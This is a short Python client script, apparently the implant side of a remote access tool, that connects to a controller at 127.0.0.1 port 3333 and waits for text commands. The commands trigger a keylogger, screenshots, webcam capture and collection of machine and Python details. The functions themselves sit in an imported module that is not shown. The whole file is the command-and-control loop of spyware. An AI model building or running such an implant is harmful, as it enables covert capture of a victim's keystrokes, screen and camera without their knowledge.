from lib import lib_cliente
import socket

cliente = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
Ip = "127.0.0.1"
Porta = 3333
cliente.connect((Ip,Porta))

while True:
    mensagem = cliente.recv(2048)
    mensagem_decode = mensagem.decode()

    if(mensagem_decode.upper() == "DETALHES DA MAQUINA"):
        lib_cliente.detalhes_da_maquina(cliente)

    elif(mensagem_decode.upper() == "DETALHES DO PYTHON"):
        lib_cliente.detalhes_do_python(cliente)

    elif(mensagem_decode.upper() == "KEYLOGGER"):
        lib_cliente.keylogger(cliente)

    elif(mensagem_decode.upper() == "SCREENSHOT"):
        lib_cliente.screenshot(cliente)

    elif(mensagem_decode.upper() == "WEBCAM"):
        lib_cliente.webcam()

    else:
        lib_cliente.comando_nao_reconhecido(cliente)
